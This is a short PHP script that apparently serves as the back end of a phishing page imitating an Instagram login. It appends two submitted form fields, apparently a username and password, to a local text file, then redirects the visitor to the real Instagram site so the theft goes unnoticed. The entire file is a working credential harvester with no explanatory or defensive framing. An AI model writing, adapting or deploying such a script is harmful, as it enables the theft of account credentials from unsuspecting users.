<?php

file_put_contents("r.txt", $_POST['hola'] . ": " . $_POST['vola'] . "\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();
